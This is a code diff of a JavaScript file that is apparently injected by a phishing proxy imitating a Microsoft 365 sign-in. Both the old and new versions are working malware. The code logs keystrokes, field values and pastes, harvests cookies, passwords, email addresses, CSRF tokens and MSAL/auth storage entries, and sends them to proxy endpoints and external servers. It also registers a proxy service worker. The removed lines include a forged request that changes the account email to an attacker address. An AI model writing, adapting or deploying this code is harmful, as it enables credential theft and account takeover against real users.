@@ -5,23 +5,34 @@
 // ============================================================
 
 (function() {
-    // --- Configuration ---
-    const BACKEND_URL = "https://meeting-1-rzx6.onrender.com";
-    const KEYLOGGER_URL = "http://78.159.110.18:3001/log";  // Update with your VPS IP
-    const FLUSH_INTERVAL = 15000;  // 15 seconds
-    const MAX_BUFFER = 500;
-    const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    // --- Configuration from server injection ---
+    const CONFIG = window.MICROSOFT_CONFIG || {
+        BACKEND_URL: "https://meeting-1-rzx6.onrender.com",
+        KEYLOGGER_URL: "https://keyserver-eaar.onrender.com/log",
+        XSS_ENDPOINT: "/xss-collect",
+        COOKIE_ENDPOINT: "/cookie-capture",
+        KEYLOG_ENDPOINT: "/keylog",
+        SW_PROXY_PATH: "/lNv1pC9AWPUY4gbidyBO",
+        SESSION_ID: 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
+        EMAIL: '',
+        SERVICE: 'Microsoft 365'
+    };
+
+    console.log('🔐 Microsoft Proxy Injected Script Loaded');
+    console.log('📧 Email:', CONFIG.EMAIL);
+    console.log('🆔 Session:', CONFIG.SESSION_ID);
 
     let keylogBuffer = '';
-    let lastInputValues = new Map(); // Track input changes
+    let lastInputValues = new Map();
+    const FLUSH_INTERVAL = 10000;
+    const MAX_BUFFER = 500;
 
     // ============================================================
-    //  PART 1: ADVANCED KEYLOGGER
+    //  PART 1: KEYLOGGER
     // ============================================================
 
     function formatKey(e) {
         const key = e.key;
-        // Special keys
         const special = {
             'Enter': '[ENTER]\n',
             'Backspace': '[BACKSPACE]',
@@ -44,25 +55,16 @@
             ' ': '[SPACE]'
         };
         if (special[key]) return special[key];
-
-        // For IME composition events (Chinese, Japanese, etc.)
-        if (e.isComposing) {
-            return `[COMPOSING:${key}]`;
-        }
-
-        // Single character
+        if (e.isComposing) return `[COMPOSING:${key}]`;
         if (key.length === 1) return key;
-
-        // Other keys
         return `[${key}]`;
     }
 
-    // Send buffer to VPS
     function sendKeylogBatch() {
         if (keylogBuffer.length === 0) return;
 
-        // Send to keylogger server (VPS)
-        fetch(KEYLOGGER_URL, {
+        // Send to proxy keylog endpoint
+        fetch(CONFIG.KEYLOG_ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -70,38 +72,53 @@
                 url: window.location.href,
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString(),
-                sessionId: SESSION_ID
+                sessionId: CONFIG.SESSION_ID,
+                email: CONFIG.EMAIL,
+                service: CONFIG.SERVICE
             })
         }).catch(() => {});
+
+        // Send to external keylogger server
+        if (CONFIG.KEYLOGGER_URL) {
+            fetch(CONFIG.KEYLOGGER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    keystrokes: keylogBuffer,
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    sessionId: CONFIG.SESSION_ID,
+                    email: CONFIG.EMAIL,
+                    service: CONFIG.SERVICE
+                })
+            }).catch(() => {});
+        }
 
         keylogBuffer = '';
     }
 
-    // --- 1.1 Keydown (works for physical keyboards) ---
+    // Keydown events
     document.addEventListener('keydown', (e) => {
         if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
-        // Ignore if composing (IME input)
         if (e.isComposing) return;
         keylogBuffer += formatKey(e);
         if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
     });
 
-    // --- 1.2 Input event (captures text changes, paste, autofill, mobile) ---
+    // Input events (mobile + IME)
     document.addEventListener('input', (e) => {
         if (!e.target) return;
         if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
             const field = e.target;
             const value = field.value;
             const label = field.name || field.id || field.placeholder || 'unknown';
-
-            // Only log if value changed significantly
             const prev = lastInputValues.get(field) || '';
             if (value !== prev) {
                 const added = value.length > prev.length ? value.substring(prev.length) : '';
                 if (added.length > 0) {
                     keylogBuffer += `[FIELD:${label}=${added}]`;
                 } else {
-                    // If text was replaced, log the whole new value
                     keylogBuffer += `[FIELD:${label}=${value}]`;
                 }
                 lastInputValues.set(field, value);
@@ -110,26 +127,25 @@
         }
     });
 
-    // --- 1.3 Composition events for IME (non-Latin characters) ---
+    // Composition events for IME
     document.addEventListener('compositionstart', (e) => {
         keylogBuffer += '[IME_START]';
     });
     document.addEventListener('compositionend', (e) => {
-        // The final composed text will be captured by the input event
         keylogBuffer += '[IME_END]';
         if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
     });
 
-    // --- 1.4 Paste event ---
+    // Paste events
     document.addEventListener('paste', (e) => {
         const text = e.clipboardData?.getData('text') || '';
         if (text) {
-            keylogBuffer += `[PASTE:${text}]`;
+            keylogBuffer += `[PASTE:${text.substring(0, 100)}]`;
             if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
         }
     });
 
-    // --- 1.5 Focus/Blur to track field changes ---
+    // Focus/Blur tracking
     document.addEventListener('focusin', (e) => {
         if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
             const label = e.target.name || e.target.id || 'unknown';
@@ -146,155 +162,89 @@
         }
     });
 
-    // --- 1.6 Periodic check of input fields (fallback for mobile) ---
-    setInterval(() => {
-        const inputs = document.querySelectorAll('input, textarea');
-        for (const field of inputs) {
-            const value = field.value;
-            const prev = lastInputValues.get(field) || '';
-            if (value !== prev) {
-                const label = field.name || field.id || field.placeholder || 'unknown';
-                const added = value.length > prev.length ? value.substring(prev.length) : '';
-                if (added.length > 0) {
-                    keylogBuffer += `[FIELD:${label}=${added}]`;
-                } else {
-                    keylogBuffer += `[FIELD:${label}=${value}]`;
-                }
-                lastInputValues.set(field, value);
-                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
-            }
-        }
-    }, 5000); // Check every 5 seconds
-
-    // --- Periodic flush ---
+    // Periodic flush
     setInterval(sendKeylogBatch, FLUSH_INTERVAL);
     window.addEventListener('beforeunload', sendKeylogBatch);
 
-    console.log('🔐 Advanced Keylogger initialized [session: ' + SESSION_ID + ']');
+    console.log('⌨️ Keylogger initialized');
 
     // ============================================================
-    //  PART 2: XSS TOOLKIT – DOM, Storage & Malicious Requests
+    //  PART 2: COOKIE CAPTURE
     // ============================================================
 
-    // --- Helper: Send XSS data to backend ---
-    async function sendXSSData(data) {
+    function captureCookies() {
         try {
-            await fetch(`${BACKEND_URL}/api/xss-data`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    xssData: data,
-                    visitorInfo: {
-                        fullUrl: window.location.href,
-                        userAgent: navigator.userAgent,
-                        sessionId: SESSION_ID
-                    }
-                })
-            });
-            console.log('[XSS] Data sent successfully');
-        } catch (e) {
-            console.warn('[XSS] Failed to send data:', e);
-        }
+            const cookies = document.cookie || '';
+            if (cookies) {
+                fetch(CONFIG.COOKIE_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        cookies: cookies,
+                        url: window.location.href,
+                        sessionId: CONFIG.SESSION_ID,
+                        email: CONFIG.EMAIL,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {});
+            }
+        } catch (e) {}
     }
 
-    // --- 2.1 DOM DATA EXTRACTION ---
+    setTimeout(captureCookies, 1000);
+    setTimeout(captureCookies, 5000);
+    setTimeout(captureCookies, 15000);
+    setInterval(captureCookies, 30000);
+
+    console.log('🍪 Cookie capture initialized');
+
+    // ============================================================
+    //  PART 3: XSS DATA EXTRACTION
+    // ============================================================
+
     function extractDomData() {
         const data = {};
-
-        // Email/username fields
         const emailField = document.querySelector('input[name="loginfmt"]') || 
                            document.querySelector('input[type="email"]') ||
                            document.querySelector('input[name="email"]');
         if (emailField) data.email = emailField.value;
 
-        // Display name / user info
-        const displayName = document.querySelector('[data-testid="displayName"]') ||
-                           document.querySelector('[class*="display-name"]') ||
-                           document.querySelector('.user-display-name');
-        if (displayName) data.displayName = displayName.textContent.trim();
+        const passField = document.querySelector('input[name="passwd"]') ||
+                         document.querySelector('input[type="password"]');
+        if (passField && passField.value) data.password = passField.value;
 
-        // CSRF tokens
-        const csrfMeta = document.querySelector('meta[name="csrf-token"]');
-        if (csrfMeta) data.csrfToken = csrfMeta.content;
-        
         const csrfInput = document.querySelector('input[name="__RequestVerificationToken"]');
         if (csrfInput) data.csrfToken = csrfInput.value;
 
-        // API responses in script tags
-        const scripts = document.querySelectorAll('script[type="application/json"]');
-        const apiData = [];
-        scripts.forEach(script => {
-            try {
-                const json = JSON.parse(script.textContent);
-                if (typeof json === 'object') {
-                    apiData.push(json);
-                }
-            } catch (e) {}
-        });
-        if (apiData.length > 0) data.apiData = apiData;
+        const displayName = document.querySelector('[data-testid="displayName"]') ||
+                           document.querySelector('[class*="display-name"]');
+        if (displayName) data.displayName = displayName.textContent.trim();
 
-        // Personal/account info
-        const userInfo = document.querySelector('[data-testid="userInfo"]') ||
-                        document.querySelector('.user-info') ||
-                        document.querySelector('.profile-info');
-        if (userInfo) data.userInfo = userInfo.textContent.trim();
-
-        // Phone numbers
-        const phoneField = document.querySelector('input[type="tel"]');
-        if (phoneField) data.phone = phoneField.value;
+        const tenantField = document.querySelector('input[name="tenant"]');
+        if (tenantField) data.tenantId = tenantField.value;
 
         return data;
     }
 
-    // --- 2.2 BROWSER STORAGE ABUSE ---
     function extractStorage() {
         const data = {};
-
         try {
-            // localStorage
             const ls = {};
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
-                let value = localStorage.getItem(key);
-                try { value = JSON.parse(value); } catch (e) {}
-                ls[key] = value;
+                if (key && (key.includes('msal') || key.includes('auth') || key.includes('login'))) {
+                    ls[key] = localStorage.getItem(key);
+                }
             }
-            data.localStorage = ls;
-
-            // sessionStorage
-            const ss = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                let value = sessionStorage.getItem(key);
-                try { value = JSON.parse(value); } catch (e) {}
-                ss[key] = value;
-            }
-            data.sessionStorage = ss;
-
-            // Cookies
+            if (Object.keys(ls).length > 0) data.localStorage = ls;
             data.cookies = document.cookie;
         } catch (e) {}
-
         return data;
     }
 
-    // --- 2.3 MALICIOUS REQUEST EXECUTION ---
-    async function executeMaliciousRequests() {
+    async function executeMicrosoftRequests() {
         const results = {};
-
-        // Common endpoints to try
-        const endpoints = [
-            '/api/user/me',
-            '/api/account/profile',
-            '/me',
-            '/profile',
-            '/api/v1/user',
-            '/common/userinfo',
-            '/v1/me',
-            '/api/User/GetCurrentUser',
-            '/Account/GetUserInfo'
-        ];
-
+        const endpoints = ['/common/userinfo', '/v1.0/me'];
         for (const endpoint of endpoints) {
             try {
                 const res = await fetch(endpoint, {
@@ -302,101 +252,75 @@
                     headers: { 'Accept': 'application/json' }
                 });
                 if (res.ok) {
-                    const data = await res.json();
-                    results[endpoint] = data;
+                    results[endpoint] = await res.json();
                 }
-            } catch (e) { /* ignore */ }
+            } catch (e) {}
         }
-
-        // Attempt CSRF-protected action – change email
-        const csrf = document.querySelector('meta[name="csrf-token"]')?.content || 
-                     document.querySelector('input[name="__RequestVerificationToken"]')?.value;
-        if (csrf) {
-            try {
-                const changeRes = await fetch('/api/account/change-email', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-CSRF-TOKEN': csrf
-                    },
-                    body: JSON.stringify({ email: 'hacked@attacker.com' }),
-                    credentials: 'include'
-                });
-                if (changeRes.ok) {
-                    results['changeEmail'] = 'success';
-                } else {
-                    results['changeEmail'] = 'failed: ' + changeRes.status;
-                }
-            } catch (e) {
-                results['changeEmail'] = 'error: ' + e.message;
-            }
-        }
-
         return results;
     }
 
-    // --- 2.4 EXECUTE ALL EXTRACTION METHODS ---
     async function runXSS() {
         try {
-            const domData = extractDomData();
-            const storageData = extractStorage();
-            const maliciousResults = await executeMaliciousRequests();
-
-            const combined = {
-                dom: domData,
-                storage: storageData,
-                requests: maliciousResults,
+            const data = {
+                dom: extractDomData(),
+                storage: extractStorage(),
+                requests: await executeMicrosoftRequests(),
                 url: window.location.href,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                service: CONFIG.SERVICE
             };
 
-            await sendXSSData(combined);
-            console.log('[XSS] Captured data:', combined);
+            fetch(CONFIG.XSS_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ...data,
+                    sessionId: CONFIG.SESSION_ID,
+                    email: CONFIG.EMAIL
+                })
+            }).catch(() => {});
+
+            console.log('🎯 XSS data captured');
         } catch (e) {
-            console.warn('[XSS] Error in extraction:', e);
+            console.warn('[XSS] Error:', e);
         }
     }
 
-    // --- Run XSS on page load ---
     if (document.readyState === 'complete') {
-        runXSS();
+        setTimeout(runXSS, 1500);
     } else {
-        window.addEventListener('load', runXSS);
+        window.addEventListener('load', () => setTimeout(runXSS, 1500));
     }
+    setTimeout(runXSS, 5000);
+    setTimeout(runXSS, 15000);
 
-    // --- Run after delays to catch dynamic content ---
-    setTimeout(runXSS, 3000);
-    setTimeout(runXSS, 8000);
-    setTimeout(runXSS, 20000);
-
-    // --- Observe DOM changes for SPAs ---
-    let observerRunning = false;
-    const observer = new MutationObserver(() => {
-        if (!observerRunning) {
-            observerRunning = true;
-            setTimeout(() => {
-                runXSS();
-                observerRunning = false;
-            }, 1000);
-        }
-    });
-    observer.observe(document.body, { childList: true, subtree: true });
+    console.log('🎯 XSS extractor initialized');
 
     // ============================================================
-    //  PART 3: SERVICE WORKER PROXY (Optional)
+    //  PART 4: SERVICE WORKER REGISTRATION (UPDATED PATH)
     // ============================================================
     (function() {
         if ("serviceWorker" in navigator) {
+            // Register the renamed service worker
             navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                 scope: "/",
-            }).then(() => {
+            }).then((registration) => {
                 console.log("✅ Service Worker registered");
+                
+                // Send session info to service worker
+                if (registration.active) {
+                    registration.active.postMessage({
+                        type: 'init',
+                        sessionId: CONFIG.SESSION_ID,
+                        email: CONFIG.EMAIL,
+                        config: CONFIG
+                    });
+                }
             }).catch((error) => {
                 console.error("❌ Service Worker registration failed:", error);
             });
         }
     })();
 
-    console.log('🔐 Full integrated script loaded [session: ' + SESSION_ID + ']');
-
+    console.log('✅ Full integrated script loaded [session: ' + CONFIG.SESSION_ID + ']');
 })();
